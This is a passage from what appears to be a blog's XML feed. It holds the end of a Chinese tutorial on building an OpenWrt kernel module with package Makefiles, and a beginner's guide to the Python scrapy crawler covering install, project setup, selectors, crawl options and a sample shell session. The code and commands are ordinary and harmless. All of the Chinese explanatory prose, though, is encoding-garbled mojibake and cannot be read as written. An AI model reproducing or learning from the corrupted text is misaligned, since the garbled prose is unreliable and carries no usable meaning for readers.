PKG_NAME:=demo
PKG_RELEASE:=1

PKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)

include $(INCLUDE_DIR)/package.mk

define KernelPackage/demo
  SUBMENU:=Other modules
  TITLE:=kernel demo
  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)
  FILES:= $(PKG_BUILD_DIR)/demo.$(LINUX_KMOD_SUFFIX)
  AUTOLOAD:=$(call AutoLoad,46,demo)
endef

define Build/Prepare
  mkdir -p $(PKG_BUILD_DIR)
  $(CP) ./src/* $(PKG_BUILD_DIR)
endef

define Build/Compile
  $(MAKE) -C &quot;$(LINUX_DIR)&quot; \
    CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \
    ARCH=&quot;$(LINUX_KARCH)&quot; \
    SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \
    EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \
    modules
endef

define KernelPackage/demo/install
  $(INSTALL_DIR) $(1)/lib/network/
endef

$(eval $(call KernelPackage,demo))
</code></pre>
<h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src - Makefile"></a>src - Makefile</h3><p>æºç çš„<code>Makefile</code>å¾ˆç®€å•ï¼Œå…¶å®åªè¦ä¸€è¡Œå°±å¤Ÿäº†ï¼Œå…¶ä¸­<code>CONFIG_&lt;module_name&gt;</code>éœ€è¦åœ¨åç»­<code>.config</code>æ–‡ä»¶ä¸­é…ç½®ï¼Œæˆ–è€…ç›´æ¥å°†<code>$(CONFIG_DEMO)</code>æ”¹ä¸º<code>y</code>æˆ–<code>m</code>å³å¯ã€‚</p>
<pre><code class="Makefile">obj ?= .

obj-$(CONFIG_DEMO) += demo.o
</code></pre>
<h2 id="æ›´æ–°-config"><a href="#æ›´æ–°-config" class="headerlink" title="æ›´æ–° .config"></a>æ›´æ–° .config</h2><p>ä½¿ç”¨<code>make menuconfig</code>æˆ–è€…ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶<code>.config</code>å¯ä»¥å¯ç”¨æ–°æ·»åŠ çš„å†…æ ¸æ¨¡å—ã€‚</p>
<ol>
<li><code>make menuconfig</code>: æœç´¢<code>demo</code>å°†å…¶é€‰ä¸­ç„¶åä¿å­˜é€€å‡º</li>
<li>æ‰‹åŠ¨å¯ç”¨ï¼Œä¿®æ”¹<code>.config</code>ï¼Œåœ¨<code>Others module</code>é…ç½®å‚æ•°é™„è¿‘æ·»åŠ å¦‚ä¸‹å†…å®¹</li>
</ol>
<pre><code class="c">CONFIG_KERNEL_kmod_demo=y
</code></pre>
<h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>å½“æºç å’Œé…ç½®é€‰é¡¹éƒ½å‡†å¤‡å¥½åï¼Œä¾¿å¯ä»¥ç¼–è¯‘å®‰è£…äº†ï¼Œå•ç‹¬å®‰è£…éœ€è¦æ•´ä¸ª<code>kernel</code>å·²ç»ç¼–è¯‘è¿‡ä¸€æ¬¡ï¼Œä»¥ä¿è¯äº¤å‰ç¼–è¯‘å·¥å…·é“¾èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ã€‚</p>
<pre><code class="sh">make package/kmod-demo/compile V=s
make package/kmod-demo/install V=s
</code></pre>
<h2 id="insmod-rmmod"><a href="#insmod-rmmod" class="headerlink" title="insmod/rmmod"></a>insmod/rmmod</h2><pre><code class="sh"># insmod
$ insmod demo.ko
Hello World

# rmmod
$ rmmod demo.ko
Exit
</code></pre>
<p>look, <code>printk</code>çš„ä¿¡æ¯å·²ç»æˆåŠŸæ‰“å°å‡ºæ¥äº†ï¼</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«4 - scrapyå…¥é—¨]]></title>
      <url>https://www.litreily.top/2018/05/27/scrapy-start/</url>
      <content type="html"><![CDATA[<p><code>scrapy</code>ä½œä¸ºä¸€æ¬¾å¼ºå¤§çš„çˆ¬è™«æ¡†æ¶ï¼Œå½“ç„¶è¦å¥½å¥½å­¦ä¹ ä¸€ç•ªï¼Œæœ¬æ–‡ä¾¿æ˜¯æœ¬äººå­¦ä¹ å’Œä½¿ç”¨<code>scrapy</code>è¿‡åçš„ä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹æ¯”è¾ƒåŸºç¡€ï¼Œç®—æ˜¯å…¥é—¨ç¬”è®°å§ï¼Œä¸»è¦è®²è¿°<code>scrapy</code>çš„åŸºæœ¬æ¦‚å¿µå’Œä½¿ç”¨æ–¹æ³•ã€‚</p>
<h2 id="scrapy-framework"><a href="#scrapy-framework" class="headerlink" title="scrapy framework"></a>scrapy framework</h2><p>é¦–å…ˆé™„ä¸Š<code>scrapy</code>ç»å…¸å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/spider/scrapy/scrapy.jpg" alt="scrapy framework"></p>
<p><code>scrapy</code>æ¡†æ¶åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†</p>
<ol>
<li><code>Scrapy Engine</code> å¼•æ“</li>
<li><code>Spiders</code> çˆ¬è™«</li>
<li><code>Scheduler</code> è°ƒåº¦å™¨</li>
<li><code>Downloader</code> ä¸‹è½½å™¨</li>
<li><code>Item Pipeline</code> é¡¹ç›®ç®¡é“</li>
<li><code>Downloader Middlewares</code> ä¸‹è½½å™¨ä¸­é—´ä»¶</li>
<li><code>Spider Middlewares</code> çˆ¬è™«ä¸­é—´ä»¶</li>
</ol>
<h3 id="spider-process"><a href="#spider-process" class="headerlink" title="spider process"></a>spider process</h3><p>å…¶çˆ¬å–è¿‡ç¨‹ç®€è¿°å¦‚ä¸‹ï¼š</p>
<ol>
<li>å¼•æ“ä»çˆ¬è™«è·å–é¦–ä¸ªå¾…çˆ¬å–çš„é“¾æ¥<code>url</code>ï¼Œå¹¶ä¼ é€’ç»™è°ƒåº¦å™¨</li>
<li>è°ƒåº¦å™¨å°†é“¾æ¥å­˜å…¥é˜Ÿåˆ—</li>
<li>å¼•æ“å‘è°ƒåº¦å™¨è¯·æ±‚è¦çˆ¬å–çš„é“¾æ¥ï¼Œå¹¶å°†è¯·æ±‚å¾—åˆ°çš„é“¾æ¥ç»ä¸‹è½½å™¨ä¸­é—´ä»¶ä¼ é€’ç»™ä¸‹è½½å™¨</li>
<li>ä¸‹è½½å™¨ä»ç½‘ä¸Šä¸‹è½½ç½‘é¡µï¼Œä¸‹è½½åçš„ç½‘é¡µç»ä¸‹è½½å™¨ä¸­é—´ä»¶ä¼ é€’ç»™å¼•æ“</li>
<li>å¼•æ“å°†ç½‘é¡µç»çˆ¬è™«ä¸­é—´ä»¶ä¼ é€’ç»™çˆ¬è™«</li>
<li>çˆ¬è™«å¯¹ç½‘é¡µè¿›è¡Œè§£æï¼Œå°†å¾—åˆ°çš„<code>Items</code>å’Œæ–°çš„é“¾æ¥ç»çˆ¬è™«ä¸­é—´ä»¶äº¤ç»™å¼•æ“</li>
<li>å¼•æ“å°†ä»çˆ¬è™«å¾—åˆ°çš„<code>Items</code>äº¤ç»™é¡¹ç›®ç®¡é“ï¼Œå°†æ–°çš„é“¾æ¥è¯·æ±‚<code>requests</code>äº¤ç»™è°ƒåº¦å™¨</li>
<li>æ­¤åå¾ªç¯2~7æ­¥ï¼Œç›´åˆ°æ²¡æœ‰å¾…çˆ¬å–çš„é“¾æ¥ä¸ºæ­¢</li>
</ol>
<p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œé¡¹ç›®ç®¡é“(<code>Item Pipeline</code>)ä¸»è¦å®Œæˆæ•°æ®æ¸…æ´—ï¼ŒéªŒè¯ï¼ŒæŒä¹…åŒ–å­˜å‚¨ç­‰å·¥ä½œï¼›ä¸‹è½½å™¨ä¸­é—´ä»¶(<code>Downloader Middlewares</code>)ä½œä¸ºä¸‹è½½å™¨å’Œå¼•æ“ä¹‹é—´çš„çš„é’©å­(<code>hook</code>)ï¼Œç”¨äºç›‘å¬æˆ–ä¿®æ”¹ä¸‹è½½è¯·æ±‚æˆ–å·²ä¸‹è½½çš„ç½‘é¡µï¼Œæ¯”å¦‚ä¿®æ”¹è¯·æ±‚åŒ…çš„å¤´éƒ¨ä¿¡æ¯ç­‰ï¼›çˆ¬è™«ä¸­é—´ä»¶(<code>Spider Middlewares</code>)ä½œä¸ºçˆ¬è™«å’Œå¼•æ“ä¹‹é—´çš„é’©å­(<code>hook</code>)ï¼Œç”¨äºå¤„ç†çˆ¬è™«çš„è¾“å…¥è¾“å‡ºï¼Œå³ç½‘é¡µ<code>response</code>å’Œçˆ¬è™«è§£æç½‘é¡µåå¾—åˆ°çš„<code>Items</code>å’Œ<code>requests</code>ã€‚</p>
<h3 id="Items"><a href="#Items" class="headerlink" title="Items"></a>Items</h3><p>è‡³äºä»€ä¹ˆæ˜¯<code>Items</code>ï¼Œä¸ªäººè®¤ä¸ºå°±æ˜¯ç»çˆ¬è™«è§£æåå¾—åˆ°çš„ä¸€ä¸ªæ•°æ®å•å…ƒï¼ŒåŒ…å«ä¸€ç»„æ•°æ®ï¼Œæ¯”å¦‚çˆ¬å–çš„æ˜¯æŸç½‘ç«™çš„å•†å“ä¿¡æ¯ï¼Œé‚£ä¹ˆæ¯çˆ¬å–ä¸€ä¸ªç½‘é¡µå¯èƒ½ä¼šå¾—åˆ°å¤šç»„å•†å“ä¿¡æ¯ï¼Œæ¯ç»„ä¿¡æ¯åŒ…å«å•†å“åç§°ï¼Œä»·æ ¼ï¼Œç”Ÿäº§æ—¥æœŸï¼Œå•†å“æ ·å¼ç­‰ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥å®šä¹‰ä¸€ç»„<code>Item</code></p>
<pre><code class="python">from scrapy.item import Item
from scrapy.item import Field

class GoodsItem(Item):
    name = Field()
    price = Field()
    date = Field()
    types = Field()
</code></pre>
<p><code>Field()</code>å®è´¨å°±æ˜¯ä¸€ä¸ªå­—å…¸<code>Dict()</code>ç±»å‹çš„æ‰©å±•ï¼Œå¦‚ä¸Šä»£ç æ‰€ç¤ºï¼Œä¸€ç»„<code>Item</code>å¯¹åº”ä¸€ä¸ªå•†å“ä¿¡æ¯ï¼Œå•ä¸ªç½‘é¡µå¯èƒ½åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå•†å“ï¼Œæ‰€æœ‰<code>Item</code>ä¿¡æ¯éƒ½éœ€è¦åœ¨<code>Spider</code>ä¸­èµ‹å€¼ï¼Œç„¶åç»å¼•æ“äº¤ç»™<code>Item Pipeline</code>ã€‚å…·ä½“å®ç°åœ¨åç»­åšæ–‡çš„å®ä¾‹ä¸­ä¼šæœ‰ä½“ç°ï¼Œæœ¬æ–‡æ—¨åœ¨ç®€å•è®°è¿°<code>scrapy</code>çš„åŸºæœ¬æ¦‚å¿µå’Œä½¿ç”¨æ–¹æ³•ã€‚</p>
<h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>with <code>pip</code></p>
<pre><code class="node">pip install scrapy
</code></pre>
<p>or <code>conda</code></p>
<pre><code class="node">conda install -c conda-forge scrapy
</code></pre>
<p>åŸºæœ¬æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="js">D:\WorkSpace&gt;scrapy --help
Scrapy 1.5.0 - no active project

Usage:
  scrapy &lt;command&gt; [options] [args]

Available commands:
  bench         Run quick benchmark test
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy

  [ more ]      More commands available when run from project directory

Use &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command
</code></pre>
<p>å¦‚æœéœ€è¦ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒï¼Œéœ€è¦å®‰è£…<code>virtualenv</code></p>
<pre><code class="node">pip install virtualenv
</code></pre>
<h2 id="scrapy-startproject"><a href="#scrapy-startproject" class="headerlink" title="scrapy startproject"></a>scrapy startproject</h2><pre><code class="sh">scrapy startproject &lt;project-name&gt; [project-dir]
</code></pre>
<p>ä½¿ç”¨è¯¥æŒ‡ä»¤å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–°çš„<code>scrapy</code>é¡¹ç›®ï¼Œä»¥<code>demo</code>ä¸ºä¾‹</p>
<pre><code class="sh">$ scrapy startproject demo
...
You can start your first spider with:
    cd demo
    scrapy genspider example example.com

$ cd demo
$ tree
.
â”œâ”€â”€ demo
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ items.py
â”‚   â”œâ”€â”€ middlewares.py
â”‚   â”œâ”€â”€ pipelines.py
â”‚   â”œâ”€â”€ __pycache__
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ spiders
â”‚       â”œâ”€â”€ __init__.py
â”‚       â””â”€â”€ __pycache__
â””â”€â”€ scrapy.cfg

4 directories, 7 files
</code></pre>
<p>å¯ä»¥çœ‹åˆ°<code>startproject</code>è‡ªåŠ¨ç”Ÿæˆäº†ä¸€äº›æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œå…¶ä¸­ï¼š</p>
<ol>
<li><code>scrapy.cfg</code>: é¡¹ç›®é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ç”¨ä¿®æ”¹</li>
<li><code>items.py</code>: å®šä¹‰<code>items</code>çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ä¸Šè¿°çš„<code>GoodsItem</code></li>
<li><code>middlewares.py</code>: ä¸­é—´ä»¶ä»£ç ï¼Œé»˜è®¤åŒ…å«ä¸‹è½½å™¨ä¸­é—´ä»¶å’Œçˆ¬è™«ä¸­é—´ä»¶</li>
<li><code>pipelines.py</code>: é¡¹ç›®ç®¡é“ï¼Œç”¨äºå¤„ç†<code>spider</code>è¿”å›çš„<code>items</code>ï¼ŒåŒ…æ‹¬æ¸…æ´—ï¼ŒéªŒè¯ï¼ŒæŒä¹…åŒ–ç­‰</li>
<li><code>settings.py</code>: å…¨å±€é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«å„ç±»å…¨å±€å˜é‡</li>
<li><code>spiders</code>: è¯¥æ–‡ä»¶å¤¹ç”¨äºå­˜å‚¨æ‰€æœ‰çš„çˆ¬è™«æ–‡ä»¶ï¼Œæ³¨æ„ä¸€ä¸ªé¡¹ç›®å¯ä»¥åŒ…å«å¤šä¸ªçˆ¬è™«</li>
<li><code>__init__.py</code>: è¯¥æ–‡ä»¶æŒ‡ç¤ºå½“å‰æ–‡ä»¶å¤¹å±äºä¸€ä¸ª<code>python</code>æ¨¡å—</li>
<li><code>__pycache__</code>: å­˜å‚¨è§£é‡Šå™¨ç”Ÿæˆçš„<code>.pyc</code>æ–‡ä»¶ï¼ˆä¸€ç§è·¨å¹³å°çš„å­—èŠ‚ç <code>byte code</code>ï¼‰ï¼Œåœ¨<code>python2</code>ä¸­è¯¥ç±»æ–‡ä»¶ä¸<code>.py</code>ä¿å­˜åœ¨ç›¸åŒæ–‡ä»¶å¤¹</li>
</ol>
<h2 id="scrapy-genspider"><a href="#scrapy-genspider" class="headerlink" title="scrapy genspider"></a>scrapy genspider</h2><p>é¡¹ç›®ç”Ÿæˆä»¥åï¼Œå¯ä»¥ä½¿ç”¨<code>scrapy genspider</code>æŒ‡ä»¤è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªçˆ¬è™«æ–‡ä»¶ï¼Œæ¯”å¦‚ï¼Œå¦‚æœè¦çˆ¬å–<a href="www.huaban.com">èŠ±ç“£ç½‘é¦–é¡µ</a>ï¼Œæ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="sh">cd demo
scrapy genspider huaban www.huaban.com
</code></pre>
<p>é»˜è®¤ç”Ÿæˆçš„çˆ¬è™«æ–‡ä»¶<code>huaban.py</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="python"># -*- coding: utf-8 -*-
import scrapy


class HuabanSpider(scrapy.Spider):
    name = &#39;huaban&#39;
    allowed_domains = [&#39;www.huaban.com&#39;]
    start_urls = [&#39;http://www.huaban.com/&#39;]

    def parse(self, response):
        pass
</code></pre>
<ul>
<li>çˆ¬è™«ç±»ç»§æ‰¿äº<code>scrapy.Spider</code></li>
<li><code>name</code>æ˜¯å¿…é¡»å­˜åœ¨çš„å‚æ•°ï¼Œç”¨ä»¥æ ‡è¯†è¯¥çˆ¬è™«</li>
<li><code>allowed_domains</code>æŒ‡ä»£å…è®¸çˆ¬è™«çˆ¬å–çš„åŸŸåï¼ŒæŒ‡å®šåŸŸåä¹‹å¤–çš„é“¾æ¥å°†è¢«ä¸¢å¼ƒ</li>
<li><code>start_urls</code>å­˜å‚¨çˆ¬è™«çš„èµ·å§‹é“¾æ¥ï¼Œè¯¥å‚æ•°æ˜¯åˆ—è¡¨ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥åŒæ—¶å­˜å‚¨å¤šä¸ªé“¾æ¥</li>
</ul>
<p>å¦‚æœè¦è‡ªå®šä¹‰èµ·å§‹é“¾æ¥ï¼Œä¹Ÿå¯ä»¥é‡å†™<code>scrapy.Spider</code>ç±»çš„<code>start_requests</code>å‡½æ•°ï¼Œæ­¤å¤„ä¸äºˆç»†è®²ã€‚</p>
<p><code>parse</code>å‡½æ•°æ˜¯ä¸€ä¸ªé»˜è®¤çš„å›è°ƒå‡½æ•°ï¼Œå½“ä¸‹è½½å™¨ä¸‹è½½ç½‘é¡µåï¼Œä¼šè°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œè§£æï¼Œ<code>response</code>å°±æ˜¯è¯·æ±‚åŒ…çš„å“åº”æ•°æ®ã€‚è‡³äºç½‘é¡µå†…å®¹çš„è§£ææ–¹æ³•ï¼Œ<code>scrapy</code>å†…ç½®äº†å‡ ç§é€‰æ‹©å™¨(<code>Selector</code>)ï¼ŒåŒ…æ‹¬<code>xpath</code>é€‰æ‹©å™¨ã€<code>CSS</code>é€‰æ‹©å™¨å’Œæ­£åˆ™åŒ¹é…ã€‚ä¸‹é¢æ˜¯ä¸€äº›é€‰æ‹©å™¨çš„ä½¿ç”¨ç¤ºä¾‹ï¼Œæ–¹ä¾¿å¤§å®¶æ›´åŠ ç›´è§‚çš„äº†è§£é€‰æ‹©å™¨çš„ç”¨æ³•ã€‚</p>
<pre><code class="python"># xpath selector
response.xpath(&#39;//a&#39;)
response.xpath(&#39;./img&#39;).extract()
response.xpath(&#39;//*[@id=&quot;huaban&quot;]&#39;).extract_first()
repsonse.xpath(&#39;//*[@id=&quot;Profile&quot;]/div[1]/a[2]/text()&#39;).extract_first()

# css selector
response.css(&#39;a&#39;).extract()
response.css(&#39;#Profile &gt; div.profile-basic&#39;).extract_first()
response.css(&#39;a[href=&quot;test.html&quot;]::text&#39;).extract_first()

# re selector
response.xpath(&#39;.&#39;).re(&#39;id:\s*(\d+)&#39;)
response.xpath(&#39;//a/text()&#39;).re_first(&#39;username: \s(.*)&#39;)
</code></pre>
<p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œ<code>response</code>ä¸èƒ½ç›´æ¥è°ƒç”¨<code>re</code>,<code>re_first</code>.</p>
<h2 id="scrapy-crawl"><a href="#scrapy-crawl" class="headerlink" title="scrapy crawl"></a>scrapy crawl</h2><p>å‡è®¾çˆ¬è™«ç¼–å†™å®Œäº†ï¼Œé‚£å°±å¯ä»¥ä½¿ç”¨<code>scrapy crawl</code>æŒ‡ä»¤å¼€å§‹æ‰§è¡Œçˆ¬å–ä»»åŠ¡äº†ã€‚</p>
<p>å½“è¿›å…¥ä¸€ä¸ªåˆ›å»ºå¥½çš„<code>scrapy</code>é¡¹ç›®ç›®å½•æ—¶ï¼Œä½¿ç”¨<code>scrapy -h</code>å¯ä»¥è·å¾—ç›¸æ¯”æœªåˆ›å»ºä¹‹å‰æ›´å¤šçš„å¸®åŠ©ä¿¡æ¯ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ç”¨äºå¯åŠ¨çˆ¬è™«ä»»åŠ¡çš„<code>scrapy crawl</code></p>
<pre><code class="sh">$ scrapy -h
Scrapy 1.5.0 - project: huaban

Usage:
  scrapy &lt;command&gt; [options] [args]

Available commands:
  bench         Run quick benchmark test
  check         Check spider contracts
  crawl         Run a spider
  edit          Edit spider
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  list          List available spiders
  parse         Parse URL (using its spider) and print the results
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy

Use &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command
</code></pre>
<pre><code class="sh">$ scrapy crawl -h
Usage
=====
  scrapy crawl [options] &lt;spider&gt;

Run a spider

Options
=======
--help, -h              show this help message and exit
-a NAME=VALUE           set spider argument (may be repeated)
--output=FILE, -o FILE  dump scraped items into FILE (use - for stdout)
--output-format=FORMAT, -t FORMAT
                        format to use for dumping items with -o

Global Options
--------------
--logfile=FILE          log file. if omitted stderr will be used
--loglevel=LEVEL, -L LEVEL
                        log level (default: DEBUG)
--nolog                 disable logging completely
--profile=FILE          write python cProfile stats to FILE
--pidfile=FILE          write process ID to FILE
--set=NAME=VALUE, -s NAME=VALUE
                        set/override setting (may be repeated)
--pdb                   enable pdb on failure
</code></pre>
<p>ä»<code>scrapy crawl</code>çš„å¸®åŠ©ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œè¯¥æŒ‡ä»¤åŒ…å«å¾ˆå¤šå¯é€‰å‚æ•°ï¼Œä½†å¿…é€‰å‚æ•°åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯<code>spider</code>ï¼Œå³è¦æ‰§è¡Œçš„çˆ¬è™«åç§°ï¼Œå¯¹åº”æ¯ä¸ªçˆ¬è™«çš„åç§°(<code>name</code>)ã€‚</p>
<pre><code class="sh">scrapy crawl huaban
</code></pre>
<p>è‡³æ­¤ï¼Œä¸€ä¸ª<code>scrapy</code>çˆ¬è™«ä»»åŠ¡çš„åˆ›å»ºå’Œæ‰§è¡Œè¿‡ç¨‹å°±ä»‹ç»å®Œäº†ï¼Œè‡³äºå®ä¾‹ï¼Œåç»­åšå®¢ä¼šé™†ç»­ä»‹ç»ã€‚</p>
<h2 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h2><p>æœ€åç®€è¦è¯´æ˜ä¸€ä¸‹æŒ‡ä»¤<code>scrapy shell</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªäº¤äº’å¼çš„<code>shell</code>,ç±»ä¼¼äºå‘½ä»¤è¡Œå½¢å¼çš„<code>python</code>ï¼Œå½“æˆ‘ä»¬åˆšå¼€å§‹å­¦ä¹ <code>scrapy</code>æˆ–è€…åˆšå¼€å§‹çˆ¬å–æŸä¸ªé™Œç”Ÿçš„ç«™ç‚¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒç†Ÿæ‚‰å„ç§å‡½æ•°æ“ä½œæˆ–è€…é€‰æ‹©å™¨çš„ä½¿ç”¨ï¼Œç”¨å®ƒæ¥ä¸æ–­è¯•é”™çº é”™ï¼Œç†Ÿç»ƒæŒæ¡<code>scrapy</code>å„ç§ç”¨æ³•ã€‚</p>
<pre><code class="sh">$ scrapy shell www.huaban.com
2018-05-29 23:58:49 [scrapy.utils.log] INFO: Scrapy 1.5.0 started (bot: scrapybot)
2018-05-29 23:58:49 [scrapy.utils.log] INFO: Versions: lxml 4.2.1.0, libxml2 2.9.5, cssselect 1.0.3, parsel 1.4.0, w3lib 1.19.0, Twisted 17.9.0, Python 3.6.3 (v3.6.3:2c5fed8, Oct  3
2017, 17:26:49) [MSC v.1900 32 bit (Intel)], pyOpenSSL 17.5.0 (OpenSSL 1.1.0h  27 Mar 2018), cryptography 2.2.2, Platform Windows-10-10.0.17134-SP0
2018-05-29 23:58:49 [scrapy.crawler] INFO: Overridden settings: {&#39;DUPEFILTER_CLASS&#39;: &#39;scrapy.dupefilters.BaseDupeFilter&#39;, &#39;LOGSTATS_INTERVAL&#39;: 0}
2018-05-29 23:58:49 [scrapy.middleware] INFO: Enabled extensions:
[&#39;scrapy.extensions.corestats.CoreStats&#39;,
 &#39;scrapy.extensions.telnet.TelnetConsole&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled downloader middlewares:
[&#39;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.retry.RetryMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.stats.DownloaderStats&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled spider middlewares:
[&#39;scrapy.spidermiddlewares.httperror.HttpErrorMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.offsite.OffsiteMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.referer.RefererMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.urllength.UrlLengthMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.depth.DepthMiddleware&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled item pipelines:
[]
2018-05-29 23:58:50 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:6023
2018-05-29 23:58:50 [scrapy.core.engine] INFO: Spider opened
2018-05-29 23:58:50 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (301) to &lt;GET http://huaban.com/&gt; from &lt;GET http://www.huaban.com&gt;
2018-05-29 23:58:50 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://huaban.com/&gt; (referer: None)
[s] Available Scrapy objects:
[s]   scrapy     scrapy module (contains scrapy.Request, scrapy.Selector, etc)
[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x03385CB0&gt;
[s]   item       {}
[s]   request    &lt;GET http://www.huaban.com&gt;
[s]   response   &lt;200 http://huaban.com/&gt;
[s]   settings   &lt;scrapy.settings.Settings object at 0x04CC4D10&gt;
[s]   spider     &lt;DefaultSpider &#39;default&#39; at 0x4fa6bf0&gt;
[s] Useful shortcuts:
[s]   fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redirects are followed)
[s]   fetch(req)                  Fetch a scrapy.Request and update local objects
[s]   shelp()           Shell help (print this help)
[s]   view(response)    View response in a browser
In [1]: view(response)
Out[1]: True

In [2]: response.xpath(&#39;//a&#39;)
Out[2]:
[&lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;re&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;æ·»åŠ é‡‡&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;add-board-item&quot;&gt;æ·»åŠ ç”»æ¿&lt;i class=&quot;&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a href=&quot;/about/goodies/&quot;&gt;å®‰è£…é‡‡é›†å·¥å…·&lt;i class&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_si&#39;&gt;]

In [3]: response.xpath(&#39;//a&#39;).extract()
Out[3]:
[&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;return false;&quot; title=&quot;å›åˆ°é¡¶éƒ¨&quot;&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;æ·»åŠ é‡‡é›†&lt;i class=&quot;upload&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;add-board-item&quot;&gt;æ·»åŠ ç”»æ¿&lt;i class=&quot;add-board&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a href=&quot;/about/goodies/&quot;&gt;å®‰è£…é‡‡é›†å·¥å…·&lt;i class=&quot;goodies&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_size=&quot;124x47&quot; logo_type=&quot;realname&quot; href=&quot;//www.anquan.org&quot; rel=&quot;nofollow&quot;&gt; &lt;script src=&quot;//static.anquan.org/static/outer/js/aq_auth.js&quot;&gt;&lt;/script&gt; &lt;/a&gt;&#39;]

In [4]: response.xpath(&#39;//img&#39;)
Out[4]: [&lt;Selector xpath=&#39;//img&#39; data=&#39;&lt;img src=&quot;https://d5nxst8fruw4z.cloudfro&#39;&gt;]

